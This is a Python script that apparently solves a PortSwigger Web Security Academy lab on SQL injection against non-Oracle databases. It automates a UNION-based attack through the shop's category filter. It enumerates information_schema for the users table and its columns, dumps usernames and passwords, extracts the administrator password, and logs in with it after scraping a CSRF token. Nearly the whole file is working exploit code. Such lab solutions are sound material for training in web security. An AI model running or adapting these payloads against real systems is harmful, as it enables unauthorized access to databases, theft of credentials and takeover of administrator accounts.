# Lab name: Lab: SQL injection attack, listing the database contents on non-Oracle databases
# Lab link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

from bs4 import BeautifulSoup
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

req = requests.Session()

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080'
}

users_table = 'users_'
username_column = 'username_'
password_column = 'password_'

admin_username = 'administrator'
password = ''

poc_payload_for_users_table = f"'union+SELECT+null,TABLE_NAME+FROM+information_schema.tables+where+TABLE_NAME+LIKE+'%25users%25'--"

def filter_url():
    global url
    url = (url.split('.net', 1)[0]) + f'.net/filter?category='

def check_if_users_table_exists():
    global url
    filter_url()
    url += poc_payload_for_users_table
    response = req.get(url, proxies=proxies, verify=False)
    return users_table in response.text

def get_users_table():
    global url
    global users_table
    filter_url()
    url += poc_payload_for_users_table
    response = req.get(url, proxies=proxies, verify=False)
    users_table += ((response.text.split(users_table,1)[1]).split('</td>',1)[0]).strip()

def check_if_username_and_password_columns_exists(payload):
    global url, username_column, password_column
    filter_url()
    url += payload
    response = req.get(url, proxies=proxies, verify=False)
    return username_column in response.text and password_column in response.text

def get_username_column():
    global url
    global username_column
    filter_url()
    url += poc_payload_for_username_column_password_column
    response = req.get(url, proxies=proxies, verify=False)
    username_column += ((response.text.split(username_column,1)[1]).split('</td>',1)[0]).strip()

def get_password_column():
    global url
    global password_column
    filter_url()
    url += poc_payload_for_username_column_password_column
    response = req.get(url, proxies=proxies, verify=False)
    password_column += ((response.text.split(password_column,1)[1]).split('</td>',1)[0]).strip()

def get_administrator_password(response):
    password = ((response.text.split(f'<th>{admin_username}</th>')[1])
           .split('</td>',1)[0]).replace('<td>','').replace('</td>','').strip()
    return password

def get_csrf_token_from_response(url):
    response = req.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input')['value']
    return csrf_token

def login_as_administrator(username, password):
    login_url = (url.split('.net', 1)[0]) + '.net/login'
    csrf = get_csrf_token_from_response(login_url)
    data = {
        'csrf':csrf,
        'username': username,
        'password': password
    }
    response = req.post(url=login_url, data=data, proxies=proxies, verify=False)
    if '/my-account?id=administrator' in response.text:
        print(f'Lab solved successfully and username: {admin_username}, password: {password}', end='')
    elif response.status_code == 504:
        print('Lab is not available, please refresh the url')
    else:
        print(f'failed to login but username: {admin_username}, password: {password} try to login yourself', end='')        
    print()
    exit(0)


url = input('Enter lab url: ')

is_users_table_exists = check_if_users_table_exists()

if is_users_table_exists:
    get_users_table()

    poc_payload_for_username_column_password_column = f"'union+SELECT+null,COLUMN_NAME+FROM+information_schema.columns+where+TABLE_NAME='{users_table}'--"
    
    get_username_column()
    
    get_password_column()

    is_username_and_password_columns_exists = check_if_username_and_password_columns_exists(
        poc_payload_for_username_column_password_column)
    
    if is_username_and_password_columns_exists:
        filter_url()
        
        payload_to_get_users_with_passwords = f"'union+SELECT+{username_column},{password_column}+from+{users_table}--"
        
        url += payload_to_get_users_with_passwords
        
        response = req.get(url, proxies=proxies, verify=False)

        if admin_username in response.text:
            password = get_administrator_password(response)
            login_as_administrator(admin_username, password)    
            
    print(f'Error failed to find {username_column} columns and {password_column} column')
    exit(0)

print(f'Error failed to find {users_table} table')

